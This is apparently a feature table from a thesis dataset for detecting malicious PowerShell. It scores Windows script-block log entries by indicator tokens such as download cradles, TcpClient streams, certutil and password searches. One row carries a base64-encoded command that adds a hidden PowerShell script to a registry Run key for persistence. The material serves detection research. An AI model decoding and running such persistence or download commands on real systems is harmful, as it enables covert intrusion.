PST-284,windows_event_4104_scriptblocktext,81,1,9,17,0.209877,0.0,0.049383,4.748568,1,0,35,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-285,windows_event_4104_scriptblocktext,120,1,13,11,0.091667,0.016667,0.108333,4.729671,1,1,16,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-286,windows_event_4104_scriptblocktext,198,1,21,68,0.343434,0.005051,0.025253,4.898798,11,11,92,0,0,0,0,0,1,0,0,0,,1,iex,1,0,0,2,downloadstring;webclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-287,windows_event_4104_scriptblocktext,139,1,11,29,0.208633,0.0,0.043165,4.851016,1,0,97,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-288,windows_event_4104_scriptblocktext,83,1,8,6,0.072289,0.012048,0.096386,4.415963,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-289,windows_event_4104_scriptblocktext,121,1,11,10,0.082645,0.033058,0.090909,4.723446,1,1,16,0,0,0,0,0,0,0,0,2,Get-CimInstance;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-290,windows_event_4104_scriptblocktext,85,1,8,6,0.070588,0.011765,0.094118,4.381688,0,0,0,0,0,0,0,0,0,0,0,1,Get-DnsClientCache,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-291,windows_event_4104_scriptblocktext,83,1,11,10,0.120482,0.024096,0.13253,4.675361,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-292,windows_event_4104_scriptblocktext,104,1,16,22,0.211538,0.067308,0.038462,4.930525,1,0,76,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-293,windows_event_4104_scriptblocktext,223,1,27,56,0.251121,0.080717,0.035874,5.186104,1,0,183,0,0,0,8,0,0,0,0,2,ient.GetStr;stem.Net.Sockets.TcpClient,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-294,windows_event_4104_scriptblocktext,208,1,26,81,0.389423,0.0,0.043269,5.010435,14,13,101,0,0,0,4,0,1,0,0,0,,0,,0,0,0,1,invoke-webrequest,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-295,windows_event_4104_scriptblocktext,58,1,6,6,0.103448,0.017241,0.086207,4.439349,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-296,windows_event_4104_scriptblocktext,268,1,26,78,0.291045,0.0,0.115672,4.877379,11,5,180,0,0,0,0,10,0,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-297,windows_event_4104_scriptblocktext,594,1,10,27,0.045455,0.02862,0.005051,4.830417,1,0,472,1,472,1,0,0,0,0,0,2,FromBase64String;TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAVQBwAGQAYQB0AGUAQwBoAGUAYwBrACcAIAAtAFYAYQBsAHUAZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABzAHQAYQBnAGUALgBwAHMAMQAnAA,1,windowstyle hidden,0,1,1,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,2,currentversion\run;new-itemproperty,0,2,2,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,4,3,3
PST-298,windows_event_4104_scriptblocktext,122,1,14,12,0.098361,0.016393,0.106557,4.770496,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-299,windows_event_4104_scriptblocktext,162,1,16,39,0.240741,0.0,0.067901,5.028722,1,0,116,0,0,0,0,0,0,0,0,4,PaSsWord;SELeCT-STrING;get-chiLdIteM;inClUdE,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,1,3,3,0,0
PST-300,windows_event_4104_scriptblocktext,265,1,24,78,0.29434,0.067925,0.10566,4.994655,11,5,175,0,0,0,0,10,0,0,0,1,System.Net.Soc,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
